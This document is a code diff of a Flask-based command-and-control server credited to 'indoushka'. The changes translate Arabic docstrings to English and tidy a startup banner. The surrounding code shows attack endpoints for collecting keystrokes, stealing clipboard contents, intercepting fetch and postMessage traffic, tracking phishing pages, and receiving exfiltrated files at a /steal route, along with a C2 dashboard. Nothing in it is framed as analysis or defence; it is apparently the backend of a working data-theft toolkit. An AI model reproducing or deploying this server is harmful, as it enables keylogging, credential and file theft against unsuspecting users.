@@ -26,7 +26,7 @@ data_store = {
 
 @app.route('/api/collect', methods=['POST'])
 def collect():
-    """نقطة تجميع البيانات الرئيسية"""
+    """Main data collection endpoint"""
     try:
         d = request.get_json()
         if d:
@@ -54,7 +54,7 @@ def collect():
 
 @app.route('/api/page', methods=['POST'])
 def page_data():
-    """بيانات الصفحات"""
+    """Endpoint for page-related data"""
     try:
         d = request.get_json()
         if d:
@@ -75,7 +75,7 @@ def page_data():
 
 @app.route('/api/key', methods=['POST'])
 def keylogger():
-    """تسجيل المفاتيح"""
+    """Endpoint for logging keystrokes"""
     try:
         d = request.get_json()
         if d:
@@ -88,7 +88,7 @@ def keylogger():
 
 @app.route('/api/fetch', methods=['POST'])
 def fetch_intercept():
-    """اعتراض fetch"""
+    """Endpoint for fetch interception"""
     try:
         d = request.get_json()
         if d:
@@ -99,7 +99,7 @@ def fetch_intercept():
 
 @app.route('/api/message', methods=['POST'])
 def message_intercept():
-    """اعتراض postMessage"""
+    """Endpoint for postMessage interception"""
     try:
         d = request.get_json()
         if d:
@@ -110,7 +110,7 @@ def message_intercept():
 
 @app.route('/api/clipboard', methods=['POST'])
 def clipboard():
-    """سرقة الحافظة"""
+    """Endpoint for clipboard data exfiltration"""
     try:
         d = request.get_json()
         if d:
@@ -123,7 +123,7 @@ def clipboard():
 
 @app.route('/api/phishing', methods=['POST'])
 def phishing():
-    """فتح صفحة الشرك"""
+    """Endpoint to track phishing page activity"""
     try:
         d = request.get_json()
         logging.warning(f"Phishing page opened: {d}")
@@ -133,7 +133,7 @@ def phishing():
 
 @app.route('/steal', methods=['POST'])
 def steal():
-    """نقطة لاستقبال الملفات المسروقة"""
+    """Endpoint for receiving exfiltrated files"""
     try:
         d = request.get_json()
         if d:
@@ -158,7 +158,7 @@ def steal():
 
 @app.route('/dashboard')
 def dashboard():
-    """لوحة التحكم"""
+    """C2 Control Dashboard interface"""
     html = '''
     <!DOCTYPE html>
     <html>
@@ -260,11 +260,9 @@ def dashboard():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════╗
-    ║     C2 Server Started by indoushka        ║
+    ║      C2 Server Started by indoushka       ║
     ╠═══════════════════════════════════════════╣
-    ║ Dashboard: http://localhost:8080/dashboard║
-    ║ Collect: http://localhost:8080/api/collect║
-    ║ Files:     ./stolen_*                     ║
+    ║ Dashboard: http://localhost:8080/dashboard ║
     ╚═══════════════════════════════════════════╝
     """)
     app.run(host='0.0.0.0', port=8080, debug=True)
